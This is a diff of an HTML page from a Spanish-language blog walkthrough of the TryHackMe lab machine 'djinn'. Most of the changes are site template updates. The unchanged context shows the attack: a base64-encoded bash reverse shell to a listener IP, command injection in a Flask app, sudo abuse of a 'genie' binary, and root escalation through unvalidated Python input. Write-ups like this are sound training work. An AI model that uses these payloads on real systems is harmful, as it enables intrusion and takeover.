@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="djinn es una maquina de TryHackMe, ejecutamos una shell inversa en una ruta de la aplicacion web, en el codigo fuente encontramos la ruta de un archivo con credenciales que nos permitio acutalizar nuestra shell al siguiente usuario que además obtuvimos acceso por SSH realizando Port Knocking. Para el movimiento lateral ejecutamos genie con parametros para una shell. Escalamos privilegios analizando el codigo fuente de un script en Python el cual no tenia validaciones en las variables lo que nos permitía ejecutar /bin/sh.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.88.1" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1439,6 +1439,10 @@
             <a href="/categories/hackthebox">HackTheBox</a>
           </li>
         
+          <li class="navbarm__menu--item navbarm__menu--subitem">
+            <a href="/categories/cyberseclabs">CyberSecLabs</a>
+          </li>
+        
 
       
       
@@ -1529,6 +1533,8 @@
       
       <a href="/categories/hackthebox" class="navbar__dropdown--item" dir="ltr">HackTheBox</a>
       
+      <a href="/categories/cyberseclabs" class="navbar__dropdown--item" dir="ltr">CyberSecLabs</a>
+      
     </div>
   </div>
   
@@ -1575,16 +1581,21 @@
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;Jul 29, 2020 </time>
+  <time class="single__info" title="Written At">Jul 29, 2020 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;9&nbsp;min read </span>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
+
+  
+
+  
+  
+  &nbsp;•&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
   
   <span class="single__info">
     
   </span>
 </div>
+
       
 <ul class="single__tags caption">
   
@@ -1594,16 +1605,16 @@
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/python/" class="single__tag" title="python">python</a></li>
-  
-
-  <li><a href="https://sckull.github.io/tags/uncompyle6/" class="single__tag" title="uncompyle6">uncompyle6</a></li>
-  
-
   <li><a href="https://sckull.github.io/tags/knockd/" class="single__tag" title="knockd">knockd</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/port-knocking/" class="single__tag" title="port knocking">port knocking</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/python/" class="single__tag" title="python">python</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/uncompyle6/" class="single__tag" title="uncompyle6">uncompyle6</a></li>
   
 
 </ul>
@@ -1654,7 +1665,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1715,7 +1726,7 @@
 </span><span class="lnt">59
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat Aug  1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Sat Aug  1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm</span>
 Nmap scan report <span class="k">for</span> djinn.thm <span class="o">(</span>10.10.181.33<span class="o">)</span>
 Host is up <span class="o">(</span>0.26s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -1780,7 +1791,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos tres archivos, uno que contiene lo que parece ser credenciales, el segundo un mensaje para @nitish81299 (nada interesante en Github y Twitter) y un posible nombre de usuario.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1831,7 +1842,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/djinn# ftp djinn.thm 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/djinn# ftp djinn.thm 
 Connected to djinn.thm.
 <span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
 Name <span class="o">(</span>djinn.thm:root<span class="o">)</span>: anonymous
@@ -1885,16 +1896,16 @@ root@upset:~/thm/djinn#
 </div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 7331.<br />
 <img src="/images/posts/thm/djinn/Screenshot_20200801_101952.webp" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster">GOBUSTER</h2>
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t <span class="m">25</span> -x php,html,txt
 /wish
 /genie
 </code></pre></td></tr></table>
@@ -1906,13 +1917,13 @@ root@upset:~/thm/djinn#
 <p>Ejecutamos una shell codificada:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Shell</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Shell</span>
 <span class="nb">echo</span>  -n <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1338 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span>base64
 <span class="c1">#Ejecutamos</span>
 <span class="nb">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8xMzM4IDA+JjEi<span class="p">|</span>base64 -d<span class="p">|</span>bash
@@ -1924,7 +1935,7 @@ root@upset:~/thm/djinn#
 <p>En el archivo <code>app.py</code> el cual ejecuta la pagina anterior encontramos una direccion a un archivo, este archivo contiene lo que parecen credenciales del usuario nitish.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1983,7 +1994,7 @@ root@upset:~/thm/djinn#
 </span><span class="lnt">57
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">subprocess</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">subprocess</span>
 
 <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">url_for</span>
 
@@ -1997,29 +2008,29 @@ root@upset:~/thm/djinn#
 
 <span class="k">def</span> <span class="nf">validate</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">CREDS</span> <span class="ow">in</span> <span class="n">cmd</span> <span class="ow">and</span> <span class="s2">&#34;cat&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="kc">True</span>
 
     <span class="k">try</span><span class="p">:</span>
         <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">RCE</span><span class="p">:</span>
             <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
                 <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">j</span><span class="p">:</span>
-                    <span class="k">return</span> <span class="bp">False</span>
-        <span class="k">return</span> <span class="bp">True</span>
+                    <span class="k">return</span> <span class="kc">False</span>
+        <span class="k">return</span> <span class="kc">True</span>
     <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">return</span> <span class="kc">False</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;main.html&#34;</span><span class="p">)</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/wish&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s2">&#34;GET&#34;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/wish&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s2">&#34;GET&#34;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">wish</span><span class="p">():</span>
     <span class="n">execute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">execute</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">validate</span><span class="p">(</span><span class="n">execute</span><span class="p">):</span>
-            <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">execute</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+            <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">execute</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
                                       <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="n">output</span> <span class="o">=</span> <span class="s2">&#34;Wrong choice of words&#34;</span>
@@ -2028,18 +2039,18 @@ root@upset:~/thm/djinn#
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;wish.html&#39;</span><span class="p">)</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/genie&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/genie&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">genie</span><span class="p">():</span>
     <span class="k">if</span> <span class="s1">&#39;name&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
         <span class="n">page</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">page</span> <span class="o">=</span> <span class="s2">&#34;It&#39;s not that hard&#34;</span>
 
-    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;genie.html&#39;</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">page</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;genie.html&#39;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">page</span><span class="p">)</span>
 
 
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Utilizamos la contraseña con el usuario y logramos obtener una shell con el usuario <code>nitish</code> y nuestra flag <code>user.txt</code>.<br />
@@ -2048,7 +2059,7 @@ root@upset:~/thm/djinn#
 <p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>genie</code> esto con el usuario sam sin contraseña.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2064,7 +2075,7 @@ root@upset:~/thm/djinn#
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:~$ sudo -l -l
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:~$ sudo -l -l
 sudo -l -l
 Matching Defaults entries <span class="k">for</span> nitish on djinn:
     env_reset, mail_badpass,
@@ -2083,7 +2094,7 @@ nitish@djinn:~$
 </div><p>Otro de los hallazgos que hicimos es un archivo de configuracion de <code>knock</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2101,7 +2112,7 @@ nitish@djinn:~$
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:/etc$ cat knockd.conf
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:/etc$ cat knockd.conf
 cat knockd.conf
 <span class="o">[</span>options<span class="o">]</span>
 	UseSyslog
@@ -2124,13 +2135,13 @@ cat knockd.conf
 <p>Ahora si, seguimos investigando sobre <code>/usr/bin/genie</code>, le pasamos los parametros que pide este ejecutable, esperando a que ejecute nuestro comando, pero al parecer no se agrega en ningun tipo de cron o proceso</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e <span class="s2">&#34;ping -c 5 10.2.29.162&#34;</span> wish
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e <span class="s2">&#34;ping -c 5 10.2.29.162&#34;</span> wish
 /usr/bin/genie -p bash -g -e <span class="s2">&#34;ping -c 5 10.2.29.162&#34;</span> wish
 We<span class="err">&#39;</span>ve added your wish to our records.
 Continue praying!!
@@ -2139,13 +2150,13 @@ Continue praying!!
 </div><p>En la documentacion de este ejecutable encontramos un parametro que no aparece en el ejecutable al mostrar la ayuda (<code>-h</code>), agregamos este parametro junto al usuario <code>sam</code>. Logramos obtener una shell con este ultimo usuario.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd gg
 my man!!
 $ whoami
 sam
@@ -2155,7 +2166,7 @@ sam
 <p>Hicimos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>lago</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2169,7 +2180,7 @@ sam
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo -l -l 
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ sudo -l -l 
 Matching Defaults entries <span class="k">for</span> sam on djinn:
     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
@@ -2186,7 +2197,7 @@ $
 </div><p>Ejecutamos este comando y nos muestra diferentes opciones pero ninguna de estas nos deja escalar privilegios. En la carpeta de este usuario encontramos un archivo <code>.pyc</code> el cual al leer las strings encontramos las mismas que el comando <code>lago</code> muestra.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2203,7 +2214,7 @@ $
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ strings .pyc
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ strings .pyc
 getuser<span class="o">(</span>
 system<span class="o">(</span>
 randintc
@@ -2223,7 +2234,7 @@ numt
 </div><p>Copiamos este archivo a nuestra maquina y utilizamos <a href="https://pypi.org/project/uncompyle6/"><strong>uncompyle6</strong></a>. Vemos en el codigo fuente, especificamente en la fucnion <code>guessit()</code> vemos que hace una comparacion de la variable <code>s</code> con <code>num</code>, en el input no realiza ninguna validacion de si lo ingresado es un entero o string, en esta funcion al adivinar el numero devuelve una shell con usuario root. Para poder aprovecharnos de este script vamos a ingresar el nombre de la variable <code>num</code> ya que la variable <code>s</code> no tiene ningun tipo de validacion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2253,9 +2264,9 @@ numt
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># uncompyle6 version 3.7.3</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># uncompyle6 version 3.7.3</span>
 <span class="c1"># Python bytecode 2.7 (62211)</span>
-<span class="c1"># Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)</span> 
+<span class="c1"># Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55) </span>
 <span class="c1"># [GCC 9.3.0]</span>
 <span class="c1"># Embedded file name: /home/mzfr/scripts/exp.py</span>
 <span class="c1"># Compiled at: 2019-11-07 07:05:18</span>
@@ -2358,7 +2369,7 @@ def guessit<span class="o">()</span>:
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20djinn&url=https%3a%2f%2fsckull.github.io%2fposts%2fdjinn%2f&hashtags=ftp%2cknockd%2cport%20knocking%2cpython%2cuncompyle6&via=sckull" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20djinn&url=https%3a%2f%2fsckull.github.io%2fposts%2fdjinn%2f&hashtags=ftp%2cknockd%2cport%20knocking%2cpython%2cuncompyle6&via=%40sckull_" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2375,7 +2386,7 @@ def guessit<span class="o">()</span>:
     
     
       
-        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="sckull" class="lazyload whoami__image"/>
+        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Dany Sucuc" class="lazyload whoami__image"/>
       
     
   </div>
@@ -2576,7 +2587,7 @@ def guessit<span class="o">()</span>:
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3678,6 +3689,11 @@ var a = document.getElementsByClassName('navbar__menu-item')
               THM: djinn
           </h6>
           
+          <label class="switch" data-ani="true">
+            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
+            <span class="slider round"></span>
+          </label>
+          
         </div>
         <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
           <nav id="TableOfContents">
@@ -3687,7 +3703,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#ftp">FTP</a></li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#gobuster">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#www-data---user">WWW-DATA - USER</a></li>
